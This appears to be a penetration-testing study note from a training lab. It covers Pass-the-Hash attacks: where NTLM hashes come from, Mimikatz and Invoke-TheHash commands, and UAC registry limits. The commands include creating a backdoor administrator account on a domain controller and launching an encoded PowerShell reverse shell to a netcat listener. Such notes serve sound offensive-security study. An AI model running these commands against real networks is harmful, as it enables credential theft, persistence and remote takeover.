- **tags**: #passTheHash #credentials #mimikatz
- --------------------------
# Pass-The-Hash
*Pass-the-hash* is an exploitation technique that involves capturing or harvesting *NTLM hashes* and utilizing them to authenticate with the target legitimately.
Hashes can be [[Dumping Credentials|obtained in several ways]], including:
- *Dumping the local SAM* database from a compromised host.
- Extracting hashes *from the NTDS database (ntds.dit) on a Domain Controller.*
- Pulling the hashes *from memory (lsass.exe)*.
We can use multiple tools to facilitate a *Pass-The-Hash* attack:
- Impacket's PsExec module
- Metasploit PsExec mdule
- CrackMapExec
- [Mimikatz](https://github.com/gentilkiwi)
- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- Evil-winrm
- [[Remote Desktop Protocol#Pass the Hash|xfreerdp]]
## PtH Lateral Movements using Mimikatz
Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.
Let's say we have landed on a host (*MS01*) and acquired the hash for user julio and we would now like to authenticate to an SMB share found on *DC01* using its credentials:
```shell
mimikatz.exe
# check
privilege::debug
# thi will start a cmd that will use the user's username and hash for remopte authentication
sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.local /run:cmd.exe
# on the new cmd we will now be able to authenticate against the DC01 and list the Share contents
dir \\dc01\julio
```
## PtH with Invoke-TheHash
This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. **Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.**
```powershell
# Importing Required Modules
Import-Module .\Invoke-TheHash.psd1

# Creating a User with Local Admin right on DC01
Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# We can alternatively start a reverse shell
nc -lnvp 8001

Invoke-WMICExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e '<base64 connection>'"
```
## UAC Limits Pass the Hash for Local Accounts
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. *Setting it to 1 allows the other local admins as well*.
**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.